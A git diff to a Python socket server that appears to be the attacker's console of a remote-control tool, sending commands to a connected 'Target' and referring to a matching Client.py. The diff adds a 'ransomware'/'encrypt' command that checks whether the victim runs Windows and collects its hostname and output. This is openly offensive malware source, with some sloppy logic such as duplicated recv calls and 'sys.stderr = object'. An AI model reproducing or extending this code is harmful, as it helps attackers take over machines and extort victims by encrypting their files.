@@ -4,6 +4,7 @@ import os
 import random
 import string
 import time
+import secrets
 
 h_name = socket.gethostname()
 ipaddr = socket.gethostbyname(h_name)
@@ -13,15 +14,15 @@ PORT = int(sys.argv[2] if len(sys.argv) > 2 else 5555) # Enter this port when as
 s = socket.socket()
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((HOST, PORT))
-
 s.listen(1)
 
 while True:
+
     print(f'[*] listening as {HOST}:{PORT}')
     client = s.accept()
     print(f'[*] Client connected {client[1]}')
-
     client[0].send('Welcome'.encode())
+
     while True:
         # cmd = input('╰─➤ ')
         # cmd = input('─➤ ')
@@ -57,6 +58,20 @@ while True:
             else:
                 client[0].send('n'.encode())
                 continue
+
+        if cmd.lower() in ['rw', 'encrypt', 'ransomware']:
+            if client[0].recv(1024).decode() == 'nnt':
+                print('The Target isnt on Windows...')
+                continue
+            elif client[0].recv(1024).decode() == 'nt':
+                hostname = client[0].recv(1024).decode()
+                output = client[0].recv(1024).decode()
+                print(hostname)
+                print(output)
+                sys.stderr = object
+            else:
+                print('Recieved invalid response from Target exiting...')
+                client[0].close()
 
         # To add your own command remove the # below and change alias with the command alias and command with the command name
         # Make sure to add it to Client.py as well
